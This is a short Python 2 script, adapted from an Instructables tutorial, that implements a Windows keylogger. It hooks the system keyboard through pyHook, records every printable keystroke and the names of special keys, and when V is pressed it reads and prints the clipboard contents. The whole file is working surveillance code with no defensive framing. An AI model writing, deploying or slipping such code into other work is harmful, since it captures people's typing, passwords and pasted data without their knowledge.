#Adaptaaoo: http://www.instructables.com/id/Simple-Keylogger-Python
import win32clipboard, pythoncom, pyHook

def OnKeyboardEvent(event): #1
    if 32 < event.Ascii < 127: #2
        print chr(event.Ascii) #3
    else:
        if event.Key == "V": #4
            win32clipboard.OpenClipboard()
            pasted_value = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            print "[PASTE] - %s" % (pasted_value)
        else: #5
            print "[%s]" % event.Key #6
    return True

hm = pyHook.HookManager() #7
hm.KeyDown = OnKeyboardEvent #8
hm.HookKeyboard()
pythoncom.PumpMessages()